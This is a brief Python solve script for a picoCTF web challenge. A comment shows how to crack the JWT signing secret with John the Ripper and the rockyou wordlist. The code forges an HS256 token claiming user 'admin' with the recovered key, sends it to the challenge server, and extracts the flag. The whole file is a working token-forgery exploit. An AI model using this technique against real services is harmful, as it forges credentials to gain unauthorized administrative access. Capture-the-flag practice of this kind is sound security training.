import jwt
import requests
import re

# To get the signing key just run `john jwtfile.txt --wordlist=/usr/share/wordlists/passwords/rockyou.txt --format=HMAC-SHA256`
headers = {
    "alg": "HS256",
    "typ": "JWT"
}
payload = {"user": "admin"}
key = "ilovepico"

cookie = jwt.encode(payload, headers=headers, key=key)
url = 'https://jupiter.challenges.picoctf.org/problem/61864/'

headers = {'Authorization': F'Bearer {cookie}'}
s = requests.Session()

s.cookies['jwt'] = cookie
r = s.get(url, headers=headers)

flag = re.findall(r'picoCTF{.*?}', r.text)[0]
print(flag)
